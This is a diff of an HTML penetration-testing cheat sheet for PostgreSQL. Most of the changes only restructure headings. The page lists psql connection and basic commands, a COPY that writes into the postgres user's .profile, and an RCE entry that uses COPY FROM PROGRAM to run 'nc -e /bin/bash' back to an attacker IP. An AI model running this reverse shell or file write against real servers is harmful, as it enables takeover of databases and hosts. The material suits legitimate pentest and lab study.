@@ -191,11 +191,13 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="general">General</h3>
-<h4 id="connect-to-postgresql-database">Connect to postgresql Database</h4>
+<h3 id="connect">Connect</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql -h 127.0.0.1 -U &lt;USER&gt; -p <span class="m">5432</span> -d &lt;DB_NAME&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psql postgresql://&lt;USER&gt;:&lt;PASSWORD&gt;@localhost:5432/&lt;DB_NAME&gt;
-</span></span></code></pre></div><h4 id="basic-commands">Basic Commands</h4>
+</span></span></code></pre></div></div>
+<h3 id="basic">Basic</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show databases</span>
 </span></span><span class="line"><span class="cl"><span class="se">\l</span>ist
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Use database</span>
@@ -210,10 +212,15 @@
 </span></span><span class="line"><span class="cl">copy <span class="o">(</span><span class="k">select</span> <span class="s1">&#39;test&#39;</span><span class="o">)</span> to <span class="s1">&#39;/var/lib/postgresql/.profile&#39;</span><span class="p">;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exit</span>
 </span></span><span class="line"><span class="cl"><span class="se">\q</span>
-</span></span></code></pre></div><h3 id="rce">RCE</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="rce">RCE</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Only superuser</span>
 </span></span><span class="line"><span class="cl">CREATE TABLE IF NOT EXISTS exec<span class="o">(</span>string text<span class="o">)</span><span class="p">;</span> COPY <span class="nb">exec</span> FROM PROGRAM <span class="s1">&#39;nc -e /bin/bash 10.10.14.10 1337 &amp;&#39;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
